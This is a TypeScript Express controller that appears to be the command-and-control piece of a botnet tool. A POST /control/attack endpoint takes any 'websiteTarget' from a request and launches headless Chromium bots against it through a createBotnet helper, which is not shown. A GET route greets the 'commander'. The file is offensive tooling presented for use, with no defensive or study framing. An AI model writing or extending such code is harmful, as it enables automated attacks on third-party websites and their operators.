import {Request, Response, NextFunction} from 'express'
import {chromium, Browser} from 'playwright'
import {createBotnet} from '../utils/botnet'

class ControlControllers {

    // [GET] /control
    index(req: Request, res: Response, next: NextFunction) {
        res.status(200).json({
            'status': 'Successfully',
            'message': 'Welcome! Our commander.'
        })
    }

    // [POST] /control/attack
    async attack(req: Request, res: Response, next: NextFunction) {
        try {
            const {websiteTarget} = req.body
            
            const browser = await chromium.launch({headless: true});
            
            await Promise.all([
                createBotnet(browser, websiteTarget, 'hfdsfk.png'),
                createBotnet(browser, websiteTarget, 'sads.png')
            ])

            res.status(200).json({
                status: 'Successfully'
            })
            
        } catch (error) {
            res.status(500).json(error)
        }
    }
}

export default new ControlControllers